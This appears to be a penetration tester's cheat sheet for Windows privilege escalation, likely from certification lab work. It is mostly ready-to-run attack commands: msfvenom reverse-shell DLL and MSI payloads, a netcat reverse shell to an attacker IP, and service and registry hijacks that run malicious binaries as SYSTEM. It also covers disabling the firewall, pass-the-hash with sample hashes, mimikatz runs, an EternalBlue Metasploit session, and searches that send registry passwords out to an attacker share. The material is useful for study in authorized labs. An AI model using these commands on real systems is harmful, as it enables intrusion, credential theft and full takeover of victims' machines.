# Windows Privilege Escalation (Win PE / EoP)

# tools

# `WinPEAS`

# `EFSPotato`, `RoguePotato`, `JuicyPotato`, `RottenPotato`
# tricks windows into authenticating with NTLM auth creds against a malicious service on localhost (via dns spoof, port forward, or traffic sniffing)
# need to be a service account user tho
whoami /priv
# current user must have `SeImpersonatePrivilege` or `SeAssignPrimaryToken` privilege
# also the CLSID param must be valid and mapped to the Windows version

# `PrintSpoofer`
# requires `SeImpersonatePrivilege`
# uses token impersonation techniques.
# entire exploit happens on localhost (not intercepting network actions like *Potato)

# `PowerUp`
# written in Powershell
# very good enumeration for a subset of privesc paths.
# CAUTION: can optionally also do auto-exploitation
# see: https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1

C:\> powershell -exec bypass
PS1> . .\PowerUp.ps1
PS1> Invoke-AllChecks

# `SharpUp`
# written in C#
# you can get a precompiled binary
# see: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe

# `Seatbelt`
# enumeration
# also highlights non-standard/third-party processes (usually targets)
# see: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SeatBelt.exe
# get help
SeatBelt.exe 
# run all enumeration checks
SeatBelt.exe all

# `accesschk.exe`
# part of Sysinternals Suite (if it fails to run, alternatives exist in Powershell etc.)
# used to list ACLs for windows elements (ie. file, directory, registry key, process, service, object)
# for when you prefer console output, or can't access the windows gui
# see: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
# `-q` Omit Banner
# `-v` Verbose
# `-u` Suppress errors
# `-w` Show only objects that have write access
# types:
# no option / default = Name is a Filesystem path, e.g., "C:\Windows"
# `-c` Name is a Windows Service, e.g., WinDefend
# `-k` Name is a Registry key, e.g. hklm\software

# Kernel Exploits
# - Windows Exploit Suggester (`wesng`)
#   see: https://github.com/bitsadmin/wesng
C:\> systeminfo > \\192.168.19.38\shared\out\systeminfo.out
 $ python3 /opt/wesng/wes.py systeminfo.out -i 'Elevation of Privilege' --exploits-only | less
# then cross-reference the output to the binaries listed in the following project
# or else exploit-db
# - Precompiled kernel exploits
#   see: https://github.com/SecWiki/windows-kernel-exploits
# - `Watson`
#   Watson is a .NET tool designed to enumerate missing KBs and 
#   suggest exploits for Privilege Escalation vulnerabilities.
#   see: https://github.com/rasta-mouse/Watson

# Services; can be abused for privesc.
# WARNING: only useful if you have the power to force a service/system restart.
#          otherwise, changes to config or svc .exe cannot take effect.
# get service configuration
C:\> sc qc <name>
# NOTICE: a `SERVICE_START_NAME` of `LocalSystem` is the `SYSTEM` user
# get service status
C:\> sc query <name>
# modify config
C:\> sc config <name> <option>= <value>
C:\> sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
# start/stop svc
C:\> net start <name>
C:\> net stop <name>

# Common types of service misconfigurations:
# Insecure service properties
# each service has an ACL ie. `SERVICE_STOP`, `SERVICE_START`, `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`
# list acls for a given service:
C:\> accesschk.exe /accepteula -wcqv <user> <svc>
# ie. you can replace the .exe with something malicious, and restart svc

# Unquoted service path
# remember, if you have perms to create a .exe in the path, you can intercept
# the path resolution algorithm.
# C:\Program Files\Some Path\svc.exe =>
#   "C:\Program.exe" "Files\Some" "Path\svc.exe"
#   "C:\Program Files\Some.exe" "Path\svc.exe"
#   "C:\Program Files\Some Path\svc.exe"

# Weak registry permissions
# if a service uses registry,
# editing those reg keys may control its behavior
# ex: find if our user can write to a svc registry key
C:\> accesschk.exe /accepteula -qvuwk HKLM\System\CurrentControlSet\Services\regsvc
# ie. if you see `RW NT AUTHORITY\INTERACTIVE` `KEY_ALL_ACCESS` then you can write
# so read the reg path
C:\> reg query HKLM\System\CurrentControlSet\Services\regsvc
# and look for anything (e.g., path to executable) you can manipulate
C:\> regsvc /v <key> /t REG_EXPAND_SZ /d <new_value> /f
C:\> net restart regsvc
# NOTICE: best to backup before making changes, so you can cleanup

# Inescure service executables
# if we can write to the service executable itself
C:\> accesschk.exe /accepteula -quvw "C:\A B\C D\ex.exe"
# then just replace it directly

# DLL hijacking
# - when a dll is loaded, it runs with perms of parent proc
# - if dll is writable, we can replace it
# - if dll is not found, we can supply it
# - if dll can be loaded from a relative path, we can intercept it
# can exfil the .exe file and run it in vm sandbox 
# together with `ProcMon64.exe` to identify dll `Load Image` calls
# then msfvenom can make a malicious .dll
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=443 -f dll -o rsh64.dll
# and restart svc

# AlwaysInstallElevated (*.msi Installer exploit)
# when two reg keys are enabled, all .msi files are executed as SYSTEM
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# so it is trivial to craft and execute a malicious .msi if already set, or if we can write to reg
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=443 -f msi -o rsh64.msi
# then execute it
C:\> msiexec /quiet /qn /i rsh64.msi

# Plaintext Password
# search for them on disk
# search for them in the registry!
reg query HKLM /f password /t REG_SZ /s >\\192.168.19.38\shared\out\hklm_passwords.out
reg query HKCU /f password /t REG_SZ /s >\\192.168.19.38\shared\out\hkcu_passwords.out

# Stored Credentials
# can be used by RunAs to authenticate without prompt (like sudoers)
C:\> cmdkey /list
C:\> runas /savecred /user:admin %TEMP%\rsh.exe

# `SAM` and `SYSTEM` files
# Windows saves passwords in these files.
# locked during normal operation
# but sometimes found in backup locations, ie. `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack`
# `SAM` contains encrypted saved password hashes
# `SYSTEM` contains key to decrypt
# if we can read/download both, we can decrypt saved passwords from our Kali workstation
# related tools: `samdump` or `pwdump` python scripts that can parse/decrypt these files.

# Scheduled tasks
# - assume the power of the user configured 
# - low users can't see other users tasks
# if the scheduled task is running a script or binary we can manipulate, 
# we'll get root when task scheduler runs it
schtasks /query /fo LIST /v

# Citrix method of privesc using windows gui applications running as SYSTEM
# `tasklist /v` to look for gui procs running as high user or group
# simply find a file open dialog and in the explorer-esque browser there is a location bar
# type one of:
file://C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
# and as soon as you hit enter, it will execute the process!
# crazy since it should be locating to that folder for read, nothing to do with RCE lol
# this even works from File > Print... Find Printer dialog, where its expecting you to type a CIFS network share path. lol!!
# i am so ashamed that i use Windows for anything now.

# Startup apps for Admin (ie. if an admin user logs in frequently)
# if we can write to the global startup apps dir, we can get a malicious rsh to run when Admin logs in
C:\> copy rsh.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# exploit-db
# search: type:local platform:windows hasapp:true priv esc
# similar to gtfobins or lolbins, a list of third-party software that can be used for privesc on windows

# Named Pipes
# the process which created the named pipe can impersonate the security context
# of any other process that connects to it.

# Listing Privileges
C:\> whoami /priv
# NOTICE: if a privilege is listed, you have it! `Disabled` column is irrelevant.
# - `SeTakeOwnershipPrivilege` grants chown to ALL objects, regardless of ACL.
# - `SeBackupPrivilege` grants read access to ALL objects, regardless of ACL.
# - `SeRestorePrivilege` grants write access to ALL objects, regardless of ACL.
# other notable privs:
# - `SeTcpPrivilege`
# - `SeCreateTokenPrivilege`
# - `SeLoadDriverPrivilege`
# - `SeDebugPrivilege` (dll injection)


# common windows privilege escalations
https://guif.re/windowseop









## windows (Manual EoP; when auto-enumeration tools fail)
# fork a second shell process
C:\> start nc.exe -n 192.168.119.198 443 -e cmd.exe
# display all current env vars
set
# display username shell is running as
echo %userdomain%\%username%
echo %path%
echo %cd%
whoami
whoami /priv
whoami /groups
net config workstation
# currently stored creds (comes w/ windows, anyone can run)
cmdkey /list
# or for cases where none of the above work...
# if you are certain about the current shell/pid you can check the user its running as 
# or you can just use `title` to set the title that will appear in tasklist...
# (NOTE: can also use this trick to find current shell so you can taskkill others...)
title zocahj1kooz7Ooku
tasklist /V | findstr /i zocahj1kooz7Ooku
# how to find pid if above doesn't work
#   using powershell
C:\> powershell (Get-WmiObject Win32_Process -Filter ProcessId=$PID).ParentProcessId
#   using wmic
C:\> for /f %a in ('wmic os get LocalDateTime ^| findstr [0-9]') do set NOW=%a
C:\> wmic process where "Name='wmic.exe' and CreationDate > '%NOW%'" get ParentProcessId | findstr [0-9]
# as vbscript
C:\> echo Set objNet=CreateObject("WScript.NetWork"):Wscript.Echo "" ^& objNet.UserDomain ^& "\\" ^& objNet.UserName > a.vbs
cscript a.vbs
# various information incl. groups
net user <USERNAME>
# display os version
systeminfo
# one of the earliest first things to do is run winPEAS! see what you can get into
# its good pre-exploit to find privilege escalation paths
# and its good post-exploit to find credential stashes etc.
# wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
C:\> wget http://192.168.119.198/winPEASx64.exe -O winPEASx64.exe
C:\> winPEASx64.exe >report.peas 2>&1
$ impacket-psexec \
  -c /usr/share/windows-resources/binaries/winPEASx64.exe \
  XOR.COM/daisy:XorPasswordIsDead17@10.11.1.122 \
  winPEASx64.exe >report.peas 2>&1;
# display uptime
net stats srv
hostname
# find other user accounts
net user
# find network info
route print
arp -A
netstat -ano
ipconfig /all
# WinXP-SP2+
netsh firewall show state
netsh firewall show config
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
# display win procs associated w/ svc
tasklist /svc
tasklist /V
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# see process uptime (powershell)
PS> Get-Process | select name, starttime
C:\> wmic process get ProcessId,ParentProcessId,Caption,CreationDate,ExecutablePath,CommandLine
# To kill a process by its PID, type the command:
taskkill /F /PID pid_number
# check status of a svc
sc qc IKEEXT
# display software installed by WMI installer
# TODO: is wmic as a whole limited to these?
wmic product get name, version, vendor
# list installed system updates (hotfixes)
wmic qfe get Caption, Description, HotFixID, InstalledOn
# display scheduled tasks
schtasks /query
schtasks /query /fo LIST /v

# find binaries that auto-elevate; os-specific shortcuts to PE; msi files
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
# if AlwaysInstallElevated REG_DWORD 0x01
# we can craft .msi file to execute as admin

# scripts that automatically enumerate PE
cd c:\tools\privilege_escalation\windows-privesc-check-master
windows-privesc-check2.exe -h
windows-privesc-check2.exe --dump -G

# list all drives, including unmounted
mountvol
# list all drives
fsutil fsinfo drives
wmic logicaldisk get name
diskpart
diskpart> list volume
diskpart> exit
# list all files on drive
>fs.txt dir \ /b /s /A-D /o:gn
7z a fs.7z fs.txt
# another way to list
robocopy "C:\" "C:\NULL" /E /L /NJH /NJS /FP /NS /NC /B /XJ

# TODO: dump interesting keys in registry
# TODO: use of `findstr` to locate strings like "password" across entire disk

# take down firewall
# see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior
# open smb to public (ONE of these worked. probably all work. will have to re-test to be certain)
# TODO: improve these to only open to me, to not ruin it for other attackers
netsh advfirewall firewall add rule name=smb dir=in action=allow protocol=TCP localport=445
netsh advfirewall firewall delete rule name="PTH (TCP)"
netsh advfirewall set currentprofile state off



# find files in path
where notepad

# example of compiling on local windows test client with mingw on windows
# see PX_03_00.mp4


# display running services and their path
powershell -nop "Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} | format-table -autosize | out-string -width 1024"


# display loaded drivers and kernel modules (version numbers not incl.)
# powershell only used tofilter output
C:\> powershell "driverquery.exe /v /fo csv | convertfrom-csv | select 'Display Name','Start Mode',Path | format-table -autosize | out-string -width 1024"
# `/v` verbose output
# `/fo csv` request csv output format
# `ConvertFrom-CSV` convert csv to obj array
# `Select` enumerate specific properties (similar to SQL)

# can use the following to then find driver versions
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
# `Get-WmiObject` cmdlet
# `Win32_PnPSignedDriver` WMI instance which provides digital signature information
# `Where-Object` filter output

# list installed drivers
driverquery /v
# `/v` verbose


# this auto-enumeration script is very thorough file, group, etc. what is read/writable to current user?
# $ cd /usr/share/windows-resources/windows-privesc-check/
# C:\> wget http://192.168.119.198/windows-privesc-check2.exe -O windows-privesc-check2.exe
windows-privesc-check2.exe --dump -A


# If you have `SeAssingPrimaryToken` or `SeImpersonate` privileges, you are SYSTEM.
# Service Accounts and Virtual Accounts are more a safety than a security feature.
# run juicypotato.exe or printspoofer.exe
# and be sure to run it from %temp% dir as cwd

# find flags
dir \*proof* /b /s /o:gn
dir \*network*secret* /b /s /o:gn
dir \*local*.*txt* /b /s /o:gn


### once i have psexec...
$ cd /workspace/recon/10.11.1.50
$ export IMPACKET="impacket-psexec -target-ip 127.0.0.1 -hashes 00000000000000000000000000000000:B74242F37E47371AFF835A6EBCAC4FFE"
$ export TARGET=alice@10.11.1.50
$ export WINPEAS=/usr/share/windows-resources/binaries/winPEASx64.exe
$ export MIMIKATZ=/usr/share/windows-resources/mimikatz/2.1.1/x64/mimikatz.exe
# winpeas
$ >report.peas 2>&1 sh -c "$IMPACKET -c $WINPEAS $TARGET";
# mimikatz
$ sh -c "$IMPACKET -c $MIMIKATZ $TARGET coffee";


# Access Tokens assigned to user (tokens include list of privileges. user have med and high integrity levels, switched by UAC)
# SID (Security Identifier) ie. for tokens, user, group
# integrity levels ie. for procs, and securable objs
# UAC (User Account Control) ie. ACL. forces procs to run as non-admin user until prompt 
#   credential prompt, consent prompt

# change admin user pw
net user admin NEW_PW
# create new user
net user USER PASS /add
# add user to administrators group
net localgroup administrators USER /add
# stop service
net stop SERVICE
# determine whether service auto-starts on boot ie. StartMode=Auto
wmic service where caption="SERVICE" get name, caption, state, startmode
# determine whether SeShutdownPrivilege will permit current user to reboot system
whoami /priv
# the fact that it's listed says its there for user. if it's not, you can still shutdown, but physical power-on will be necessary 
# the State=Disabled just means user has it but process (ie. whoami) doesn't. (process could request and use, but hasn't)
# but as that user you can definitely do it via cmd.exe
shutdown /r /t 0
# `/r` reboot
# `/t` delay 0 seconds


# example .c mingw windows pe bin cross-compiled to exec shell cmds
cat <<! > adduser.c
#include <stdlib.h>
int main() { return system("whoami"); }
!
sudo i686-w64-mingw32-gcc adduser.c -o adduser.exe
# can xfer to target ie. via reverse shell ftp get from malicious host



# launch cmd.exe via UAC prompt to elevated high integrity access
powershell Start-Process cmd.exe -Verb runAs

# TODO: look for `appcmd.exe` of iis, a common vulnerability

# icacls tells us about fs perms -rwx------
# NOTICE: C:\Program Files\ dir is writable by user
# output SID followed by permission mask for a file
icacls "C:\Program Files\a\b\c.exe"

# list readable/writable directories [which shouldn't be]
# NOTICE: this binary must be uploaded; its is part of Sysinternals Suite
# wget https://download.sysinternals.com/files/SysinternalsSuite.zip
# /usr/share/windows-resources/sysinternals/accesschk64.exe accesschk.exe
accesschk.exe -accepteula -uws "Everyone" "C:\Program Files"
# or with powershell
PS> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}


# add registry key from cmd (default entry is null)
reg add HKCU\Software\a\b\c
# modify registry key specifying type:value
reg add HKCU\Software\a\b\c /v VALUE /t REG-SZ
# `/v VALUE` specify value
# `/t REG-SZ` specify type
# modify registry key specifying default value
reg add HKCU\Software\a\b\c /d VALUE /f
# `/d VALUE` default value
# `/f` silent

### unquoted service paths
# when a windows path contains a space
# it must be enclosed to quotation marks (explicitly declared)
# otherwise it is open to interpretation
# ie. `"a\b c\d"` vs. `a\b c\d`
# if file `a\b` exists, then it is executed and passed `c\d` as params


# scan for eternalblue
nmap -Pn -p445 --script=smb-vuln-ms17-010 10.10.10.40
metasploit -q
msf> search ms17-010
msf> use windows/smb/ms17_010_eternalblue
msf> set rhosts 10.10.10.40
# notice: set payload or you'll get a generic/shell_reverse_tcp one
msf> run















# == Stored credentials == 

## Search for credentials within:
## Unattend credentials are stored in base64 and can be decoded manually with base64:
## user@host $ base64 -d cABhAHMAcwB3AG8AcgBkAFAAYQBzAHMAdwBvAHIAZAA=
dir c:\unattend.xml

## Metasploit Framework enum_unattend module and gather credentials module:
## http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/enum_unattend.rb
## http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/credentials/gpp.rb

type c:\sysprep.inf
type c:\sysprep\sysprep.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini

findstr /S pass *.txt *.xml *.ini  // in C:\

# find out what groups a user is part of
net user <userName> /domain | find "Group"

# == Windows Registry ==

VNC Stored:
reg query "HKCU\Software\ORL\WinVNC3\Password"

Windows Autologin:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# is UAC enabled ?
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
    EnableLUA    REG_DWORD    0x0  // NO
    EnableLUA    REG_DWORD    0x1  // YES


# SNMP Parameters:
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty clear text proxy credentials:
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search the registry - copy (pipe) to the clipboard (optional)
reg query HKLM /f password /t REG_SZ /s [ |clip]
reg query HKCU /f password /t REG_SZ /s [ |clip]

## Change the upnp service binary
sc qc upnphostsc config upnphost binpath= "net user /add"
sc config upnphost obj= ".\LocalSystem" password =""
net stop upnphost
net start upnphost

## copy all files in the remote directory to the local directory
mget *   ##confirm with yes on all files . Maybe /y will help ?

## to copy multiple files from the local machine to the remote machine;
mput *   ##confirm with yes on all files . Maybe /y will help ?


# Copy a file in cmd
copy FreeSSHDService.ini c:\"Program Files"\freeSSHd /y

# pass the hash Windows
pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE //10.11.1.49 cmd.exe
#after % starts the password
# aad3b435b51404eeaad3b435b51404ee: is the blnk LM hash

# pass the hash
wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE alice@localhost

# Exec commands on remote Windows machine
PsExec.exe \\10.11.1.49 -u alice -p somepasswd cmd

# get a file from Kali to the remote Windows machine
TFTP.EXE -i 10.11.1.49 get PsExec64.exe

# remote port forwarding
#from Windows -> Kali
plink.exe -l root -pw Parolaroot -R 445:127.0.0.1:445 

# Redirect port with plink.exe
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   ##redirects the Windows port 445 to Kali on port 22

# == SYSINTERNALS ==
## Use the tools in https://github.com/crsftw/OSCP-cheat-sheet/tree/master/privesc/tools_win
## use the -accepteula to avoid the GUI asking to accept...EULA
##  PsExec.exe –accepteula

PsExec64.exe -accepteula \\10.11.1.49 -u user -p somepassword cmd
powershell -ExecutionPolicy Bypass C:\Users\Public\PsExec.exe -accepteula \\localhost -u alice -p XXXX cmd

PsExec - execute processes remotely
PsFile - shows files opened remotely
PsGetSid - display the SID of a computer or a user
PsInfo - list information about a system
PsPing - measure network performance
PsKill - kill processes by name or process ID
PsList - list detailed information about processes
PsLoggedOn - see who's logged on locally and via resource sharing (full source is included)
PsLogList - dump event log records
PsPasswd - changes account passwords
PsService - view and control services
PsShutdown - shuts down and optionally reboots a computer
PsSuspend - suspends processes
PsUptime - shows you how long a system has been running since its last reboot (PsUptime's functionality has been incorporated into PsInfo)